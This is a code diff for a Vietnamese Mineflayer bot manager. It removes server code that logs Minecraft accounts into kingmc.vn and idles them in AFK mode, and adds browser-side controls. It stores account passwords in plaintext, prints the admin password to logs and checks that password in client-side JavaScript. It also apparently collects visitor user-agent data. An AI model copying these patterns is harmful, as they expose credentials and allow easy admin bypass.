+            userAgent: navigator.userAgent
         });
-
-        const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
-        clientData[clientIp].accounts.push({
-            id,
-            username: username.trim(),
-            password: password ? password.trim() : 'caigicungdc',
-            autoReconnect: true,
-            status: 'OFFLINE',
-            color: '#ff4444'
-        });
-        saveData();
-        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-        socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
-    });
-
-    socket.on('delete_account', (id) => {
-        if (clientData[clientIp].bots[id]) {
-            try { clientData[clientIp].bots[id].quit(); } catch(e){}
-            delete clientData[clientIp].bots[id];
-        }
-        clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
-        saveData();
-        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-        socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
-    });
-
-    socket.on('toggle_auto_reconnect', (id) => {
-        const acc = clientData[clientIp].accounts.find(a => a.id === id);
-        if (acc) {
-            acc.autoReconnect = !acc.autoReconnect;
-            saveData();
-            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-        }
-    });
-
-    socket.on('get_accounts', () => {
-        socket.emit('init_accounts', clientData[clientIp].accounts);
-    });
-
-    // ============================================================
-    //  BOT MINEFLAYER - KHÔNG WEBHOOK, CHỈ LOG NỘI BỘ
-    // ============================================================
-    socket.on('start_bot', (id) => {
-        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
-        if (!account) return;
-
-        if (clientData[clientIp].bots[id]) {
-            try { clientData[clientIp].bots[id].quit(); } catch(e){}
-            delete clientData[clientIp].bots[id];
-        }
-
-        // ===== HÀM LOG THÔNG BÁO NỘI BỘ =====
-        const logSystem = (msg, isImportant = false) => {
-            socket.emit('log', `[${account.username}] ${msg}`);
-            // Nếu là tin quan trọng và Admin đang login, gửi thêm thông báo đặc biệt
-            if (isImportant) {
-                socket.emit('admin_notification', {
-                    username: account.username,
-                    message: msg,
-                    time: new Date().toLocaleString()
-                });
-            }
-        };
-
-        let botState = {
-            step: 0,
-            isLoggedIn: false,
-            isInKingSMP: false,
-            isAfk: false
-        };
-
-        account.status = 'CONNECTING...';
-        account.color = 'yellow';
-        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
         
-        botState.step = 1;
-        logSystem(`🔄 Đang kết nối tới kingmc.vn...`);
+        socket.emit('add_account', { username, password });
+        document.getElementById('new-username').value = '';
+        document.getElementById('new-password').value = '';
+    }
 
-        try {
-            const bot = mineflayer.createBot({
-                host: 'kingmc.vn',
-                port: 25565,
-                username: account.username,
-                password: account.password,
-                auth: 'offline',
-                version: '1.16.5',
-                checkTimeoutInterval: 120000
-            });
+    function startBot(id) {
+        socket.emit('start_bot', id);
+    }
 
-            clientData[clientIp].bots[id] = bot;
+    function stopBot(id) {
+        socket.emit('stop_bot', id);
+    }
 
-            bot.on('login', () => {
-                account.status = 'LOGGING IN...';
-                account.color = 'orange';
-                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-                logSystem(`🔑 Đang đăng nhập...`);
-            });
-
-            bot.on('spawn', () => {
-                if (botState.step < 2) {
-                    botState.step = 2;
-                    account.status = 'ONLINE / LOBBY';
-                    account.color = '#00ff88';
-                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-                    logSystem(`✅ Đã vào Sảnh chính!`);
-                }
-            });
-
-            bot.on('messagestr', (message) => {
-                const msgLower = message.toLowerCase();
-
-                if (!botState.isLoggedIn) {
-                    if (msgLower.includes('/register') || msgLower.includes('/dk')) {
-                        botState.step = 3;
-                        setTimeout(() => { if (bot) bot.chat(`/dk ${account.password} ${account.password}`); }, 2000);
-                    } else if (msgLower.includes('/login') || msgLower.includes('/dn')) {
-                        botState.step = 3;
-                        setTimeout(() => { if (bot) bot.chat(`/dn ${account.password}`); }, 1000);
-                        setTimeout(() => { if (bot && !botState.isLoggedIn) bot.chat(`/dn ${account.password}`); }, 4000);
-                    }
-                }
-
-                if (!botState.isLoggedIn && (msgLower.includes('đăng nhập thành công') || msgLower.includes('bạn đã đăng nhập'))) {
-                    botState.isLoggedIn = true;
-                    botState.step = 4;
-                    logSystem(`✅ Đã đăng nhập thành công! Đợi 5s gõ /menu...`, true);
-
-                    setTimeout(() => {
-                        if (bot && !botState.isInKingSMP) {
-                            botState.step = 5;
-                            logSystem(`📋 Đang gõ /menu...`);
-                            bot.chat('/menu');
-                        }
-                    }, 5000);
-                }
-
-                if (botState.isLoggedIn && !botState.isInKingSMP && 
-                    (msgLower.includes('kingsmp') && msgLower.includes('chào mừng'))) {
-                    botState.isInKingSMP = true;
-                    account.status = 'ONLINE / KINGSMP';
-                    account.color = '#00ff88';
-                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-                    logSystem(`✅ ĐÃ VÀO KINGSMP!`, true);
-                    
-                    setTimeout(() => {
-                        if (bot && !botState.isAfk) {
-                            botState.step = 7;
-                            logSystem(`💤 Gửi lệnh /afk...`);
-                            bot.chat('/afk');
-                        }
-                    }, 3000);
-                }
-            });
-
-            // ===== WINDOWOPEN =====
-            bot.on('windowOpen', (window) => {
-                const rawTitle = JSON.stringify(window.title || '').toLowerCase();
-                
-                if (rawTitle.includes('menu') || rawTitle.includes('sảnh') || rawTitle.includes('afk') || rawTitle.includes('treo')) {
-                    logSystem(`📂 Menu mở: ${rawTitle}`);
-                }
-
-                // BƯỚC 6: Click Slot 24 - KingSMP
-                if (botState.step === 5 || (!botState.isInKingSMP && (rawTitle.includes('sảnh') || rawTitle.includes('lobby') || rawTitle.includes('menu')))) {
-                    setTimeout(() => {
-                        if (!bot || !bot.currentWindow) {
-                            logSystem(`⚠️ Không có window để click, thử lại sau...`);
-                            return;
-                        }
-                        botState.step = 6;
-                        logSystem(`🖱️ Click Slot 24 chọn KingSMP...`);
-
-                        bot.clickWindow(24, 0, 0)
-                            .then(() => {
-                                logSystem(`✅ Click Slot 24 thành công!`);
-                                botState.isInKingSMP = true;
-                                account.status = 'ONLINE / KINGSMP';
-                                account.color = '#00ff88';
-                                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-                                logSystem(`✅ ĐÃ VÀO KINGSMP!`, true);
-                                
-                                setTimeout(() => {
-                                    if (bot && !botState.isAfk) {
-                                        botState.step = 7;
-                                        logSystem(`💤 Gửi lệnh /afk...`);
-                                        bot.chat('/afk');
-                                    }
-                                }, 3000);
-                            })
-                            .catch(() => {
-                                logSystem(`⚠️ Lỗi click Slot 24, thử lại sau 3 giây...`);
-                                setTimeout(() => {
-                                    if (!bot || !bot.currentWindow) return;
-                                    logSystem(`🖱️ Click Slot 24 (lần 2)...`);
-                                    bot.clickWindow(24, 0, 0)
-                                        .then(() => {
-                                            logSystem(`✅ Click Slot 24 thành công (lần 2)!`);
-                                            botState.isInKingSMP = true;
-                                            account.status = 'ONLINE / KINGSMP';
-                                            account.color = '#00ff88';
-                                            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-                                            logSystem(`✅ ĐÃ VÀO KINGSMP!`, true);
-                                            
-                                            setTimeout(() => {
-                                                if (bot && !botState.isAfk) {
-                                                    botState.step = 7;
-                                                    logSystem(`💤 Gửi lệnh /afk...`);
-                                                    bot.chat('/afk');
-                                                }
-                                            }, 3000);
-                                        })
-                                        .catch(() => {
-                                            logSystem(`⚠️ Vẫn lỗi click Slot 24, kiểm tra lại menu`);
-                                        });
-                                }, 3000);
-                            });
-
-                        setTimeout(() => { 
-                            try { bot.closeWindow(window); } catch(e){} 
-                        }, 500);
-
-                    }, 4000);
-                }
-
-                // BƯỚC 8 + 9: Click Slot 1 - AFK
-                if (botState.step >= 7 && !botState.isAfk && 
-                    (rawTitle.includes('afk') || rawTitle.includes('tự động') || rawTitle.includes('treo'))) {
-                    
-                    setTimeout(() => {
-                        if (!bot || !bot.currentWindow) return;
-                        
-                        botState.step = 9;
-                        logSystem(`🖱️ Click Slot 1 chọn AFK...`);
-
-                        bot.clickWindow(1, 0, 0)
-                            .then(() => {
-                                botState.isAfk = true;
-                                botState.step = 10;
-                                logSystem(`🎉 BOT ĐÃ HOẠT ĐỘNG AFK THÀNH CÔNG!`, true);
-                            })
-                            .catch(() => {
-                                logSystem(`⚠️ Bỏ qua lỗi transaction AFK (server đã xử lý)`);
-                                botState.isAfk = true;
-                                botState.step = 10;
-                                logSystem(`🎉 BOT ĐÃ HOẠT ĐỘNG AFK THÀNH CÔNG!`, true);
-                            });
-
-                        setTimeout(() => { 
-                            try { bot.closeWindow(window); } catch(e){} 
-                        }, 500);
-
-                    }, 3500);
-                }
-            });
-
-            bot.on('end', (reason) => {
-                logSystem(`⚠️ Ngắt kết nối: ${reason}`, true);
-                account.status = 'OFFLINE';
-                account.color = '#ff4444';
-                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-                
-                delete clientData[clientIp].bots[id];
-                saveData();
-
-                if (account.autoReconnect) {
-                    logSystem(`🔄 Tự động kết nối lại sau 6 giây...`);
-                    setTimeout(() => {
-                        if (!clientData[clientIp].bots[id] && account.autoReconnect) {
-                            socket.emit('start_bot', id);
-                        }
-                    }, 6000);
-                }
-            });
-
-            bot.on('error', (err) => {
-                if (err.code === 'EPIPE') {
-                    logSystem(`⚠️ Mất kết nối server, đang thử lại...`, true);
-                } else if (err.code === 'ECONNREFUSED') {
-                    logSystem(`❌ Không thể kết nối tới server!`, true);
-                } else {
-                    logSystem(`❌ Lỗi: ${err.message}`, true);
-                }
-            });
-
-        } catch (e) {
-            logSystem(`Lỗi khởi tạo: ${e.message}`, true);
-            account.status = 'ERROR';
-            account.color = '#ff4444';
-            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+    function deleteAccount(id) {
+        if (confirm('Xóa tài khoản này?')) {
+            socket.emit('delete_account', id);
         }
-    });
+    }
 
-    socket.on('stop_bot', (id) => {
-        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
-        if (account) {
-            account.status = 'STOPPED';
-            account.color = '#ff4444';
-            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-        }
-        if (clientData[clientIp].bots[id]) {
-            try { clientData[clientIp].bots[id].quit(); } catch(e){}
-            delete clientData[clientIp].bots[id];
-        }
-        saveData();
-        socket.emit('log', `[SYSTEM] ⏹️ Đã dừng bot: ${account ? account.username : id}`);
-    });
+    function toggleAutoReconnect(id) {
+        socket.emit('toggle_auto_reconnect', id);
+    }
 
-    socket.on('send_chat', ({ id, cmd }) => {
-        const bot = clientData[clientIp].bots[id];
-        if (bot) {
-            bot.chat(cmd);
-            socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`);
+    function sendAccountChat(id) {
+        const input = document.getElementById(`chat_${id}`);
+        const cmd = input.value.trim();
+        if (cmd) {
+            socket.emit('send_chat', { id, cmd });
+            input.value = '';
+        }
+    }
+
+    function sendRemoteChat() {
+        const select = document.getElementById('remoteBotSelect');
+        const input = document.getElementById('remoteChatInput');
+        const id = select.value;
+        const cmd = input.value.trim();
+        if (id && cmd) {
+            socket.emit('send_chat', { id, cmd });
+            input.value = '';
+            appendLog(`💬 Đã gửi lệnh "${cmd}" tới bot`);
         } else {
-            socket.emit('log', `[⚠️] Bot này chưa online!`);
+            alert('Chọn bot và nhập lệnh!');
         }
-    });
+    }
 
-    socket.on('disconnect', () => {
-        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
-    });
-});
+    function adminLogin() {
+        const pass = document.getElementById('adminPass').value;
+        if (pass === ADMIN_PASSWORD) {
+            isAdminLoggedIn = true;
+            document.getElementById('adminContent').style.display = 'block';
+            document.getElementById('adminPass').value = '';
+            socket.emit('get_accounts');
+            appendLog('🔓 Admin đã đăng nhập');
+            
+            // Nếu đang trong bảo trì, hiện nút tắt khẩn cấp
+            if (currentMaintenance) {
+                const adminBtn = document.getElementById('adminMaintenanceBtn');
+                if (adminBtn) adminBtn.style.display = 'block';
+            }
+        } else {
+            alert('❌ Sai mật khẩu!');
+        }
+    }
 
-server.listen(PORT, () => {
-    console.log(`🚀 Server đang chạy tại: http://localhost:${PORT}`);
-    console.log(`👑 Admin IP: ${ADMIN_IP}`);
-    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
-    console.log(`📂 Dữ liệu lưu tại: ${DATA_FILE}`);
-});
+    function adminLogout() {
+        isAdminLoggedIn = false;
+        document.getElementById('adminContent').style.display = 'none';
+        document.getElementById('adminPass').value = '';
+        appendLog('🚪 Admin đã đăng xuất');
+        
+        // Ẩn nút tắt khẩn cấp
+        const adminBtn = document.getElementById('adminMaintenanceBtn');
+        if (adminBtn) adminBtn.style.display = 'none';
+    }
+
+    function clearCollectedData() {
+        if (confirm('Xóa toàn bộ dữ liệu đã thu thập?')) {
+            socket.emit('clear_collected_data');
+        }
+    }
+
+    function toggleMaintenance() {
+        socket.emit('toggle_maintenance', !currentMaintenance);
+    }
+
+    appendLog('🚀 Đang kết nối server...');
+</script>
+</body>
+</html>
